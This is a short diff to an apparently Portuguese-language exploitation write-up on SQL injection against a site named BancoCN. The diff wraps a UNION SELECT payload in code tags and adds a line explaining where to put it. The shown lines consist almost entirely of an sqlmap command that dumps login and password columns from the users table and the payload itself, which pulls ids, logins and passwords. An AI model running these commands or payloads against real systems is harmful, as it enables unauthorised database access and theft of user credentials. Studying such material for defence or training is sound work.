@@ -21,4 +21,5 @@
 <strong>sqlmap -u [http://bancocn.com] -D bancocn -T users -C login,password --dump</strong>
 
 ## Exploitation BancoCN SQL Injection
--1 UNION SELECT 1,2,group_concat(id,";",login,";",password) FROM users
+<code>-1 UNION SELECT 1,2,group_concat(id,";",login,";",password) FROM users</code>
+### Substitua a partir do número 1 da URL, por essa instrução de consulta SQL, onde serão retornados na tela os dados da tabela users do Banco CN, esta instrução solicita de forma concatenada as requisições dos campos id, login e password da tabela USERS.
